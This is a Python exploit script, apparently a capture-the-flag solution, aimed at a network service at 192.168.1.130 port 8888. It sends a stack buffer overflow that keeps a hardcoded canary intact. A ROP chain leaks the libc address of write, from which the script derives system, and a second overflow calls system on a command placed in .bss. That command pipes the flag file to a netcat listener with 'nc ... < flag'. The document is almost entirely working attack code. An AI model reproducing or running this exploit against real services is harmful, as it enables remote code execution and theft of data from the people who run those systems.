from socket import *
from struct import *
from time   import sleep
 
IP   = "192.168.1.130"
PORT = 8888
 
p   = lambda x : pack("<L", x)
up  = lambda x : unpack("<L", x)[0]
con = lambda s, i, p : s.connect((i, p))
 
s = socket(AF_INET, SOCK_STREAM)
con(s, IP, PORT)
 
canary    = p(0x0af21b00)
vuln      = p(0x08048FC6)
write     = p(0x080486e0)
write_got = p(0x0804b040)
read      = p(0x08048620)
bssSec    = 0x0804b0a0 + 0xf10
pop3ret   = p(0x080495BD)
offset    = 0x8bb50
 
s.recv(1024)
s.recv(1024)
s.recv(1024)
s.recv(4096)
 
s.send("4\n") # Selete Vulnerable Function
sleep(1)      # Delay
 
s.recv(1024)
 
command = "nc 192.168.1.130 33333 < flag\x00"
 
payload  = "JUNK" * 3
payload += read
payload += pop3ret
payload += p(0x04)
payload += p(bssSec)
payload += p(len(command))
# read(4, &.bss, strlen(command))
 
payload += write
payload += pop3ret
payload += p(0x04)
payload += write_got
payload += p(0x04)
# write(4, write@got, 4)
 
payload += vuln
payload += "JUNK"
payload += p(0x04)
# vuln(4)
 
s.send("y" * 10 + canary + payload)
s.send(command)
 
write_libc = up(s.recv(4))
system     = write_libc - offset
 
print "[*] write@libc  : ", hex(write_libc)
print "[*] system@libc : ", hex(system)
 
s.recv(1024)
 
payload  = "JUNK" * 3
payload += p(system)
payload += "JUNK"
payload += p(bssSec)
# system(&.bss)
 
s.send("y" * 10 + canary + payload + "\n")